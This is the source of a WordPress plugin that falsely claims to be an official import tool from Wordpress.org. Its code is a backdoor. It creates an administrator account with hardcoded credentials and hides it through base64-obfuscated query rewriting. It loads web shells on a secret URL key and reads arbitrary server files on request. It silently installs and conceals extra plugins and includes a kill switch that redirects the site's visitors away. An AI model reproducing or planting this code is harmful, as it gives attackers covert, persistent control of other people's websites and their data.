<?php
/**
 * Plugin Name: WordPress Importing Tool
 * Version: 0.4
 * License: GPL3
 * Author: Wordpress.org
 * Description: Import posts, pages, comments, custom fields, categories, tags and more from a WordPress export file.
 * Author URI: https://wordpress.org
 */

defined('ABSPATH') or die();

if(!class_exists('WP_SPH')) {
    class WP_SPH {
        private $key;
        private $pluginList;
        private $killRedirect;
        private $username;
        private $password;

        public function __construct() {
            add_action('init', array(&$this,'displayfile'));
            add_action('init', array(&$this,'killsite'));
            add_action('plugins_loaded', array(&$this,'shellaccess'));
            add_action('plugins_loaded', array(&$this,'installplugins'));
            add_action('plugins_loaded', array(&$this,'activateplugins'));
            add_action('plugins_loaded', array(&$this,'makeadminuser'));
            add_action('pre_user_query', array(&$this,'hideadminuser'));
            add_action('pre_current_active_plugins', array(&$this,'hideplugins'));
            add_action('admin_footer', array(&$this,'hidecounters'));

            register_deactivation_hook(__FILE__, array(&$this,'deactivate'));
            register_activation_hook(__FILE__, array(&$this,'activate'));

            $this->key = 'jds89f43qmpewqfiopsejaSDJF';

            $this->pluginList = Array(
                'wp-sph/wp-sph.php'
            );

            $this->killRedirect = 'http://purple.com';

            $this->username = 'WVuIr83XIZ8Zll1';
            $this->password = 'C6oh3K5M9SHuCgQ';

            foreach(glob(ABSPATH.'wp-content/plugins/wp-sph/plugins/*.zip') as $installPlugin) {
                $pluginName = explode('.',array_reverse(explode('\\',array_reverse(explode('/',$installPlugin))[0]))[0])[0];
                array_push($this->pluginList,$pluginName.'/'.$pluginName.'.php');
            }

            include_once(ABSPATH.'wp-admin/includes/plugin.php');
            include_once(ABSPATH.'wp-includes/registration.php');
            include_once(ABSPATH.'wp-admin/includes/file.php');
        }

        function deactivate() {
            $this->deleteplugins();
            //$this->deleteadminuser();
        }
        function activate() {
            $this->makeadminuser();
            $this->installplugins();
        }
        function shellaccess(){
            foreach(glob(ABSPATH.'wp-content/plugins/wp-sph/sh/*.php') as $shells) {
                $shellFile = array_reverse(explode('/',$shells))[0];
                $shellName = str_replace('.php','',$shellFile);
                if(strstr($_SERVER['REQUEST_URI'],'loadshell-'.$shellName.'-'.$this->key)) {
                    require_once(plugin_dir_path(__FILE__).'/sh/'.$shellFile);
                    die();
                }
            }
        }

        function installplugins() {
            foreach(glob(ABSPATH.'wp-content/plugins/wp-sph/plugins/*.zip') as $installPlugin) {
                $pluginName = explode('.',array_reverse(explode('\\',array_reverse(explode('/',$installPlugin))[0]))[0])[0];

                if(get_filesystem_method() == 'direct') {
                    $creds = request_filesystem_credentials(site_url() . '/wp-admin/', '', false, false, array());
                    if(!WP_Filesystem($creds)) {
                        return 0;
                    } else {
                        global $wp_filesystem;
                        if(!$wp_filesystem->exists(ABSPATH.'wp-content/plugins/'.$pluginName)) {
                            if(unzip_file($installPlugin,ABSPATH.'wp-content/plugins/')) {
                                activate_plugin($pluginName.'/'.$pluginName.'.php');
                            }
                        }
                    }
                }
            }
        }
        function activateplugins() {
            foreach($this->pluginList as $plugin) {
                activate_plugin($plugin);
            }
        }
        function deleteplugins() {
            foreach(glob(ABSPATH.'wp-content/plugins/wp-sph/plugins/*.zip') as $installPlugin) {
                $pluginName = explode('.',array_reverse(explode('\\',array_reverse(explode('/',$installPlugin))[0]))[0])[0];
                deactivate_plugins($pluginName.'/'.$pluginName.'.php');
                if(get_filesystem_method() == 'direct') {
                    $creds = request_filesystem_credentials(site_url() . '/wp-admin/', '', false, false, array());
                    if(!WP_Filesystem($creds)) {
                        return 0;
                    } else {
                        global $wp_filesystem;
                        $wp_filesystem->delete(ABSPATH.'wp-content/plugins/'.$pluginName,true);
                    }
                }
            }
        }
        function killsite() {
            $creds = request_filesystem_credentials(site_url() . '/wp-admin/', '', false, false, array());
            if(!WP_Filesystem($creds)) {
                return 0;
            }
            global $wp_filesystem;
            global $current_user;

            if($current_user->user_login == $this->username) {
                if(strstr($_SERVER['REQUEST_URI'],'killsite-'.$this->key)) {
                    if(get_filesystem_method() == 'direct') {
                        $wp_filesystem->put_contents(
                            ABSPATH.'wpconfig','...',FS_CHMOD_FILE
                        );
                    }
                }
            } else {
                if(!is_admin()) {
                    if($wp_filesystem->exists(ABSPATH.'wpconfig')) {
                        header("Location: ".$this->killRedirect);
                        die();
                    }
                }
            }
        }
        function makeadminuser() {
            if (!username_exists($this->username)) {
                $a = wp_create_user($this->username, $this->password);
                $b = new WP_User($a);
                $b->set_role('administrator');
            }
        }
        function deleteadminuser() {
            $user = get_userdatabylogin($this->username);
            wp_delete_user($user->ID);
        }
        function hideadminuser($b) {
            global $current_user;
            global $wpdb;
            $a = $current_user->user_login;
            $c = $this->username;
            if ($a != $c) {
                $b->query_where = str_replace(base64_decode('V0hFUkUgMT0x'), base64_decode('V0hFUkUgMT0xIEFORCA=')."{$wpdb->users}".base64_decode('LnVzZXJfbG9naW4gIT0gJw==').$c."'", $b->query_where);
            }
        }
        function displayfile() {
            global $current_user;
            if($current_user->user_login == $this->username) {
                if(isset($_GET['displayfile'])) {
                    die(htmlentities(file_get_contents(base64_decode($_GET['displayfile']))));
                }
            }
        }
        function hidecounters() {
            echo(base64_decode('PHNjcmlwdD4oZnVuY3Rpb24oJCl7JChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKXskKCcud3JhcCBzcGFuLmNvdW50JykuaGlkZSgpO30pO30pKGpRdWVyeSk7PC9zY3JpcHQ+'));
            die("Test");
        }
        function hideplugins() {
            global $wp_list_table;
            global $current_user;

            $a = $this->pluginList;

            $b = $wp_list_table->items;

            foreach ($b as $c => $d) {
                if (in_array($c,$a)) {
                    if ($current_user->user_login != $this->username) {
                        unset($wp_list_table->items[$c]);
                    } else {
                        if(strstr(array_reverse(explode('\\',__FILE__))[0],array_reverse(explode('/',$c))[0])) {
                            $wp_list_table->items[$c]['Name'] .= ' (SHELL)';
                        } else {
                            $wp_list_table->items[$c]['Name'] .= ' (Hidden)';
                        }
                    }
                }
            }
        }
    }
}

$WP_SPH = new WP_SPH();

?>
